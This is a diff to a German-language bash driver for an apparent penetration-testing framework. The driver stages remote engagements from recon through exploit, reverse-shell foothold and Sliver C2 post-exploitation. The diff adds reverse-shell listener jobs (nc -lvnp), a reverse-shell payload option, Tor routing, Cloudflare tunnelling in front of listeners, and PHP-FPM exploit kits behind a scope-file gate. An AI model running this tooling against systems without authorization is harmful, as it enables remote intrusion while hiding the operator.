@@ -10,6 +10,10 @@ source "$ROOT/scripts/docker-env.sh"
 source "$ROOT/remote/lib/scope.sh"
 source "$ROOT/remote/lib/term.sh"
 source "$ROOT/remote/lib/state.sh"
+source "$ROOT/remote/lib/curl.sh"
+source "$ROOT/remote/lib/rshell.sh"
+source "$ROOT/remote/lib/sliver-host.sh"
+source "$ROOT/remote/lib/kits.sh"
 source "$ROOT/remote/phases/00-scope.sh"
 source "$ROOT/remote/phases/10-recon.sh"
 source "$ROOT/remote/phases/20-fingerprint.sh"
@@ -24,8 +28,9 @@ engage — Remote-Engagement gegen autorisierte Produktivsysteme (RoE-Gate)
 
   vtbw-php2shell-lab engage run <target-url> [optionen]
   vtbw-php2shell-lab engage resume <session-id>
-  vtbw-php2shell-lab engage listeners <session-id>   Listener-Fenster erneut spawnen
+  vtbw-php2shell-lab engage listeners <session-id>
   vtbw-php2shell-lab engage status [session-id]
+  vtbw-php2shell-lab engage kits              Unterprojekte: vorhanden / fehlend
 
 Pflicht (jedes Mal):
   scope-authorized.txt  — Ziel-Host muss eingetragen sein (RoE-Nachweis)
@@ -33,15 +38,26 @@ Pflicht (jedes Mal):
 
 Optionen (Env):
   ENGAGE_SID=…            Session-Id (Default: UTC-Timestamp)
-  ENGAGE_TOR=on           Recon/Probes über Tor (Exit 127.0.0.1:9050)
-  ENGAGE_C2=sliver        Post-Ex-Profil (Default: none)
+  ENGAGE_TOR=on           Recon/Probes/Audit über Host-Tor (127.0.0.1:9050)
+  ENGAGE_C2=sliver        Host-Sliver (fetch-sliver, kein Compose)
+  ENGAGE_RS=on|off        lukechilds RAAS (Default: on)
+  ENGAGE_RS_PORT=4445
+  ENGAGE_TUNNEL=on        Cloudflare Quick Tunnel vor den Listener
+  ENGAGE_JACKALSYN=auto|off   Framework-selftest; --lab nur mit ENGAGE_FCGI_HOST
+  ENGAGE_FCGI_HOST=…      optional FCGI für Jackalsyn --lab
+  ENGAGE_DTOR=0x…         zval_ptr_dtor für Jackalsyn --lab
+  ENGAGE_SINGULARITY=detect|off   Bundle + detect (kein insmod)
+  ENGAGE_ZER061=auto|off
   ENGAGE_LHOST=…          Operator-IP für Rückkanal (Pflicht ab Phase 40)
   ENGAGE_LPORT=4444
   ENGAGE_TERMINAL=tmux|gnome|konsole|kitty|xterm|none
 
 Phasen (inkrementell, resume-fähig, Artefakte in out/engage/<sid>/):
-  00 scope → 10 recon → 20 fingerprint → 30 exploit
-    → 40 foothold (Listener-Fenster) → 50 post-ex (C2/Console-Fenster) → 60 report
+  00 scope+kits → 10 recon → 20 fingerprint (host patch_audit)
+    → 30 exploit (FPM PoC, Zer061, Jackalsyn, WAF)
+    → 40 foothold (nc + RAAS-Payload + optional Tunnel)
+    → 50 post-ex (Sliver-Host, Tor-Beweis, Singularity-detect)
+    → 60 report
 EOF
 }
 
@@ -49,6 +65,8 @@ cmd_run() {
   local url="${1:?Ziel-URL fehlt (siehe: engage help)}"
   export TARGET_URL="$url"
   export ENGAGE_SID="${ENGAGE_SID:-$(date -u +%Y%m%d-%H%M%S)}"
+  export ENGAGE_RS="${ENGAGE_RS:-on}"
+  export ENGAGE_SINGULARITY="${ENGAGE_SINGULARITY:-detect}"
   state_init "$ENGAGE_SID"
   echo "════════════════════════════════════════════════"
   echo " engage · Session $ENGAGE_SID · Ziel $TARGET_URL"
@@ -90,13 +108,17 @@ cmd_resume() {
 cmd_listeners() {
   local sid="${1:?Session-Id fehlt}"
   export ENGAGE_SID="$sid"; state_init "$sid"
-  local lhost lport
+  local lhost lport rsport
   lhost="$(state_get 40 LISTEN_HOST)"; lport="$(state_get 40 LISTEN_PORT)"
+  rsport="$(state_get 40 RS_PORT)"
   [[ -z "$lport" ]] && { echo "Keine Listener-Phase in $sid." >&2; exit 1; }
-  term_spawn_jobs "p2s-$sid" "$ENGAGE_DIR/logs" \
-    "listener|nc -lvnp $lport" \
+  local jobs=(
+    "listener|nc -lvnp $lport"
     "logs|tail -f '$ENGAGE_DIR/logs/30-exploit.log'"
-  echo "Listener erneut gestartet (Port $lport)."
+  )
+  [[ -n "$rsport" ]] && jobs+=("rs-raas-$rsport|nc -lvnp $rsport")
+  term_spawn_jobs "p2s-$sid" "$ENGAGE_DIR/logs" "${jobs[@]}"
+  echo "Listener erneut gestartet (Port $lport${rsport:+ + RAAS $rsport})."
 }
 
 cmd_status() {
@@ -114,11 +136,18 @@ cmd_status() {
   done
 }
 
+cmd_kits() {
+  ENGAGE_DIR="${ENGAGE_DIR:-$ROOT/out/engage/_kits}"
+  mkdir -p "$ENGAGE_DIR/logs"
+  kits_inventory
+}
+
 case "${1:-help}" in
   run)       shift; cmd_run "$@" ;;
   resume)    shift; cmd_resume "$@" ;;
   listeners) shift; cmd_listeners "$@" ;;
   status)    shift; cmd_status "$@" ;;
+  kits)      cmd_kits ;;
   help|--help|-h|"") usage ;;
   *) usage; exit 1 ;;
 esac
